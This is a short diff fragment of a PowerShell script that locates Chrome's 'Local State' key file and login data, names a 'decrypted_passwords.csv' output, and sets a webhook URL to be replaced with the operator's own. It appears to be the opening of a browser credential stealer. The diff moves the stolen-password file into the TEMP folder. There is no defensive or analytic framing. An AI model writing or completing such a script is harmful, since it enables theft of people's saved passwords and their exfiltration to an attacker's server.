@@ -1,8 +1,8 @@
 # Define paths
 $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
 $loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-$outputCsv = "decrypted_passwords.csv"
-$webhookUrl = "http://localhost/webhook/webhook.php"  # Update with your actual webhook URL
+$outputCsv = "$env:TEMP\decrypted_passwords.csv"
+$webhookUrl = "http://localhost/webhook/webhook.php"  # Replace with your webhook URL
 
 # Function to get the decryption key
 function Get-ChromeKey {
